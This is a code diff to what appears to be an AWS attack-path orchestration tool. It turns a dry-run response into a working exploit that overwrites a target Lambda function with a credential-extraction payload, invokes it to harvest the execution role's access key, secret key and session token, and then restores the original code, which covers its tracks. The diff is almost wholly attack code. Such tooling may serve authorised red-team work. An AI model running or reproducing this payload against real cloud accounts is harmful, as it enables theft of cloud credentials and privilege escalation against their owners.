@@ -356,16 +356,148 @@ class Orchestrator:
             elif edge_type == "CanUpdateFunction":
                 lam = session.client("lambda")
                 func_name = target_arn.split(":")[-1]
-                # This is a dry-run / info response — actual code update needs a zip
-                return {
-                    "success": True,
-                    "action": "lambda:UpdateFunctionCode",
-                    "result": {
-                        "message": f"lambda:UpdateFunctionCode is authorized for {func_name}. "
-                                   f"Actual code deployment requires a deployment package.",
-                        "function_arn": target_arn,
-                    },
-                }
+                logger.info(f"CanUpdateFunction: deploying credential-extraction payload to {func_name}...")
+
+                import io
+                import zipfile
+
+                # 1. Get the Lambda's execution role ARN (for logging)
+                func_config = lam.get_function(FunctionName=func_name)
+                exec_role_arn = func_config["Configuration"]["Role"]
+                original_handler = func_config["Configuration"]["Handler"]
+                original_runtime = func_config["Configuration"]["Runtime"]
+                logger.info(f"  Target execution role: {exec_role_arn}")
+
+                # 2. Backup: download the current deployment package
+                original_code_url = func_config["Code"]["Location"]
+                import urllib.request
+                original_zip_bytes = urllib.request.urlopen(original_code_url).read()
+                logger.info(f"  Original code backed up ({len(original_zip_bytes)} bytes)")
+
+                # 3. Build credential-extraction payload
+                payload_code = (
+                    "import json, boto3\n"
+                    "def handler(event, context):\n"
+                    "    sts = boto3.client('sts')\n"
+                    "    identity = sts.get_caller_identity()\n"
+                    "    # Get the role session credentials from the Lambda environment\n"
+                    "    import os\n"
+                    "    return {\n"
+                    "        'statusCode': 200,\n"
+                    "        'body': json.dumps({\n"
+                    "            'arn': identity['Arn'],\n"
+                    "            'access_key_id': os.environ.get('AWS_ACCESS_KEY_ID', ''),\n"
+                    "            'secret_access_key': os.environ.get('AWS_SECRET_ACCESS_KEY', ''),\n"
+                    "            'session_token': os.environ.get('AWS_SESSION_TOKEN', ''),\n"
+                    "        })\n"
+                    "    }\n"
+                )
+                zip_buffer = io.BytesIO()
+                with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
+                    zf.writestr("index.py", payload_code)
+                zip_bytes = zip_buffer.getvalue()
+
+                # 4. Deploy the payload
+                lam.update_function_code(
+                    FunctionName=func_name,
+                    ZipFile=zip_bytes,
+                )
+                logger.info(f"  Code uploaded to {func_name}, waiting for code update to complete...")
+
+                # Wait for code update to complete before updating configuration
+                import time as _time
+                for _attempt in range(15):
+                    _time.sleep(2)
+                    _fn = lam.get_function(FunctionName=func_name)
+                    state = _fn["Configuration"].get("State", "Active")
+                    update_status = _fn["Configuration"].get("LastUpdateStatus", "Successful")
+                    if state == "Active" and update_status == "Successful":
+                        break
+                    logger.info(f"  Waiting for code update... (state={state}, update={update_status})")
+
+                # Update handler to point to our payload
+                lam.update_function_configuration(
+                    FunctionName=func_name,
+                    Handler="index.handler",
+                    Runtime="python3.12",
+                )
+                logger.info(f"  Handler updated, waiting for configuration update to propagate...")
+
+                # 5. Wait for the function to become active
+                for _attempt in range(15):
+                    _time.sleep(2)
+                    _fn = lam.get_function(FunctionName=func_name)
+                    state = _fn["Configuration"].get("State", "Active")
+                    update_status = _fn["Configuration"].get("LastUpdateStatus", "Successful")
+                    if state == "Active" and update_status == "Successful":
+                        break
+                    logger.info(f"  Waiting for config update... (state={state}, update={update_status})")
+
+                # 6. Invoke the Lambda to extract credentials
+                logger.info(f"  Invoking {func_name} to extract execution role credentials...")
+                invoke_resp = lam.invoke(
+                    FunctionName=func_name,
+                    InvocationType="RequestResponse",
+                    Payload=json.dumps({}),
+                )
+                resp_payload = json.loads(invoke_resp["Payload"].read())
+                logger.info(f"  Lambda response status: {resp_payload.get('statusCode')}")
+
+                # Parse the credentials from the response
+                body = json.loads(resp_payload.get("body", "{}"))
+                harvested_key = body.get("access_key_id", "")
+                harvested_secret = body.get("secret_access_key", "")
+                harvested_token = body.get("session_token", "")
+                harvested_arn = body.get("arn", "")
+
+                # 7. Restore the original code
+                logger.info(f"  Restoring original code for {func_name}...")
+                lam.update_function_code(
+                    FunctionName=func_name,
+                    ZipFile=original_zip_bytes,
+                )
+                # Restore original handler and runtime
+                for _attempt in range(10):
+                    _time.sleep(2)
+                    _fn = lam.get_function(FunctionName=func_name)
+                    if _fn["Configuration"].get("State") == "Active" and _fn["Configuration"].get("LastUpdateStatus") == "Successful":
+                        break
+                lam.update_function_configuration(
+                    FunctionName=func_name,
+                    Handler=original_handler,
+                    Runtime=original_runtime,
+                )
+                logger.info(f"  Original code restored for {func_name}.")
+
+                if harvested_key and harvested_secret:
+                    return {
+                        "success": True,
+                        "action": "lambda:UpdateFunctionCode+Invoke",
+                        "result": {
+                            "message": f"Successfully injected payload into {func_name}, invoked it, "
+                                       f"and harvested execution role credentials for {exec_role_arn}. "
+                                       f"Original code has been restored.",
+                            "function_arn": target_arn,
+                            "execution_role_arn": exec_role_arn,
+                            "assumed_identity": harvested_arn,
+                            "access_key_id": harvested_key,
+                            "secret_access_key": harvested_secret,
+                            "session_token": harvested_token,
+                        },
+                    }
+                else:
+                    return {
+                        "success": True,
+                        "action": "lambda:UpdateFunctionCode+Invoke",
+                        "result": {
+                            "message": f"Payload deployed and invoked on {func_name}, but could not "
+                                       f"extract credentials from the response. The Lambda's execution "
+                                       f"role is {exec_role_arn}. Original code has been restored.",
+                            "function_arn": target_arn,
+                            "execution_role_arn": exec_role_arn,
+                            "raw_response": resp_payload,
+                        },
+                    }
 
             elif edge_type == "CanRunInstance":
                 return {
